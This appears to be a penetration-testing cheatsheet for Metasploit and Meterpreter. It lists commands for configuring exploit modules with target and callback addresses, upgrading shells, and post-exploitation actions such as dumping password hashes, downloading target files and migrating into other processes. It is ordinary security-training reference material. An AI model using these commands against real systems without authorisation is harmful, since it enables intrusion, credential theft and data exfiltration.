# Metasploit / Meterpreter Cheatsheet

## Starting msfconsole

```bash
msfconsole
msfconsole -q        # quiet — skip the banner
```

## Setting Up a Session

```bash
use <module_path>
show options         # list required/optional settings
set RHOSTS <ip>
set RPORT <port>
set LHOST <your_ip>
set LPORT <port>
run                  # or: exploit
```

## Upgrading a Shell to Meterpreter

```bash
# From msfconsole, after a plain shell session exists:
sessions -u <session_id>

# Or background the shell first, then upgrade:
# (inside a shell session)
background
sessions -u <id>
```

## Useful Meterpreter Commands

| Command | What it does |
|---------|-------------|
| `sysinfo` | OS, hostname, architecture |
| `getuid` | Current user |
| `shell` | Drop into a system shell |
| `background` | Send session to background |
| `sessions -l` | List all active sessions |
| `sessions -i <id>` | Interact with a session |
| `sessions -u <id>` | Upgrade shell → meterpreter |
| `upload <src> <dst>` | Upload file to target |
| `download <src> <dst>` | Download file from target |
| `hashdump` | Dump local password hashes (needs root/SYSTEM) |
| `getpid` | Current process ID |
| `ps` | List running processes |
| `migrate <pid>` | Migrate into another process |
| `lpwd` / `lcd` | Local working dir / change local dir |
| `pwd` / `cd` | Remote working dir / change remote dir |
